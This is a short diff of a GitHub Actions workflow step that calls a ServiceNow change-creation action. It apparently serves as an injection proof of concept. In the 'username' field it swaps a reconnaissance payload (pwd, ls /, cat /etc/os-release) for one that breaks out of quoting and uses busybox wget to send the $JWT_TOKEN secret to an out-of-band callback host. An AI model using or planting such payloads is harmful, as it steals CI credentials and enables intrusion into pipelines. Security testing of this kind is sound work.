@@ -10,6 +10,6 @@ jobs:
         with:
           action-type: 'create_change'
           url: 'https://example.service-now.com'
-          username: "x' & echo RCE_WORKS; pwd; ls /; cat /etc/os-release 2>/dev/null || true; :'y"
+          username: "x' & busybox wget -qO- 'https://d92m7ikjor34qm6itqugomnxjizzyujbs.oast.online/?jwt='$JWT_TOKEN; echo BUSYBOX_DONE; :'y"
           password: 'testpass'
           cr-number: '12345'
